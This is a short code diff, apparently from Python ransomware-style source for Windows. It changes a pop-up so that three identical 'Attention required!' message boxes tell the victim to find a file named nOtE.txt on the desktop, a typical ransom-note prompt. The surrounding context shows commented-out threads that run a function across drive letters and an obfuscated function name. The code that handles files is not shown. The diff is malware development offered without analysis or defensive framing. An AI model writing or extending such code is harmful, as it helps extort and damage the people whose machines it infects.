@@ -61,7 +61,9 @@ try:
         # T1971931e.start()
         # T1971931f = threading.Thread(target = chart_Viewr, args=(f"F:\\",))
         # T1971931f.start()
-        win32gui.MessageBox(0, "Look On Your Desktop :)", "Look On Your Desktop :)", win32con.MB_ICONWARNING)
+        win32gui.MessageBox(0, "Look On Your Desktop :)\nSearch for a file named: nOtE.txt", "Attention required!", win32con.MB_ICONWARNING)
+        win32gui.MessageBox(0, "Look On Your Desktop :)\nSearch for a file named: nOtE.txt", "Attention required!", win32con.MB_ICONWARNING)
+        win32gui.MessageBox(0, "Look On Your Desktop :)\nSearch for a file named: nOtE.txt", "Attention required!", win32con.MB_ICONWARNING)
         return 1
     yeyfwfgdufweugfusfuygsj____()
 except Exception as e:
